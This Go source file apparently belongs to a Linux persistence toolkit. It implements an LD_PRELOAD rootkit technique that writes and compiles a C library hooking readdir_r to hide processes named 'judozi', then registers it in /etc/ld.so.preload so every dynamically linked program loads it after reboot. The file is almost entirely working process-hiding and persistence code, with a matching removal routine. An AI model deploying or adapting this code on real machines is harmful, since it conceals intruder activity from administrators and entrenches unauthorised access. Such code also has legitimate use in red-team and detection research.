//go:build linux

package techniques

import (
	"fmt"
	"os"
	"os/exec"
)

type LDPreload struct {
	libPath string
}

func NewLDPreload() Technique {
	return &LDPreload{
		libPath: "/usr/local/lib/libprocesshider.so",
	}
}

func (l *LDPreload) Name() string {
	return "LD_PRELOAD Injection"
}

func (l *LDPreload) Description() string {
	return "Shared library injection via LD_PRELOAD"
}

func (l *LDPreload) StealthLevel() string {
	return "high"
}

func (l *LDPreload) SurvivesReboot() bool {
	return true
}

func (l *LDPreload) Install() error {
	// Create a simple LD_PRELOAD library that hooks functions
	sourceCode := `#include <stdio.h>
#include <dlfcn.h>
#include <dirent.h>
#include <string.h>
#include <unistd.h>

#define PROCESS_TO_HIDE "judozi"

static int (*original_readdir_r)(DIR *, struct dirent *, struct dirent **) = NULL;

int readdir_r(DIR *dirp, struct dirent *entry, struct dirent **result) {
    if (!original_readdir_r) {
        original_readdir_r = dlsym(RTLD_NEXT, "readdir_r");
    }
    
    int ret = original_readdir_r(dirp, entry, result);
    
    if (ret == 0 && *result != NULL) {
        if (strstr(entry->d_name, PROCESS_TO_HIDE) != NULL) {
            return readdir_r(dirp, entry, result);
        }
    }
    
    return ret;
}
`
	
	tmpSource := "/tmp/preload.c"
	if err := os.WriteFile(tmpSource, []byte(sourceCode), 0644); err != nil {
		return fmt.Errorf("write source: %w", err)
	}
	
	// Compile shared library
	cmd := exec.Command("gcc", "-shared", "-fPIC", "-o", l.libPath, tmpSource, "-ldl")
	if err := cmd.Run(); err != nil {
		return fmt.Errorf("compile library: %w", err)
	}
	
	// Add to /etc/ld.so.preload
	f, err := os.OpenFile("/etc/ld.so.preload", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		return fmt.Errorf("open ld.so.preload: %w", err)
	}
	defer f.Close()
	
	if _, err := f.WriteString(l.libPath + "\n"); err != nil {
		return fmt.Errorf("write to ld.so.preload: %w", err)
	}
	
	os.Remove(tmpSource)
	
	return nil
}

func (l *LDPreload) Remove() error {
	// Remove from /etc/ld.so.preload
	data, err := os.ReadFile("/etc/ld.so.preload")
	if err != nil {
		return err
	}
	
	lines := []string{}
	for _, line := range splitLines(string(data)) {
		if line != l.libPath {
			lines = append(lines, line)
		}
	}
	
	os.WriteFile("/etc/ld.so.preload", []byte(joinLines(lines)), 0644)
	os.Remove(l.libPath)
	
	return nil
}

func (l *LDPreload) Details() string {
	return fmt.Sprintf(`LD_PRELOAD library installed: %s
Configuration: /etc/ld.so.preload

This library is loaded by every dynamically linked program.
Currently configured to hide processes containing "judozi" in their name.

The library will be automatically loaded on every program execution.
`, l.libPath)
}
